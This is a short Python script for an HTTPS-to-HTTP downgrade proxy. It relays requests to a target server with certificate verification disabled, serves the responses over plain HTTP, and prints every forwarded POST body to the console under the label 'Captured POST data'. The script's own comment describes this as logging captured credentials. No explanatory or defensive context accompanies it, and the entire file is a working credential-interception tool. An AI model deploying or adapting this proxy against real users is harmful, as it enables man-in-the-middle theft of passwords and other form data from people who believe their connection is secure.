import http.server
import socketserver
import urllib.request
import ssl

# Proxy server configuration
PORT = 8080
TARGET_SERVER = "https://localhost"

# Create an unverified SSL context to bypass certificate verification
ssl_context = ssl._create_unverified_context()

class DowngradeProxy(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # Forward GET request to the target HTTPS server
        url = TARGET_SERVER + self.path
        try:
            with urllib.request.urlopen(url, context=ssl_context) as response:
                content = response.read()
                # Send response as HTTP, not HTTPS
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(content)
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())

    def do_POST(self):
        # Forward POST request to the target HTTPS server
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        url = TARGET_SERVER + self.path
        try:
            req = urllib.request.Request(url, data=post_data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
            with urllib.request.urlopen(req, context=ssl_context) as response:
                content = response.read()
                # Send response as HTTP, not HTTPS
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(content)
                # Log the captured credentials
                print(f"Captured POST data: {post_data.decode()}")
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())

if __name__ == "__main__":
    # Start the proxy server
    with socketserver.TCPServer(("", PORT), DowngradeProxy) as httpd:
        print(f"Proxy server running on port {PORT}")
        httpd.serve_forever()
